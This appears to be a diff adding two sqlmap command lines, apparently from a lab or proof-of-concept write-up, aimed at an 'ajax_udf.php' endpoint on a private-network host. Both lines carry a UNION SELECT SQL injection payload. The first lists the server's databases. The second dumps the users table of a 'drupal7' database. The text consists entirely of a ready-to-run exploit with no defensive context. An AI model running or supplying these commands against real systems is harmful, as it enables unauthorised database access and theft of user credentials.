@@ -1,0 +1,2 @@
+sqlmap -u "http://192.168.1.101/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9" --dbs
+sqlmap -u "http://192.168.1.101/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9" --dump -D drupal7 -T users
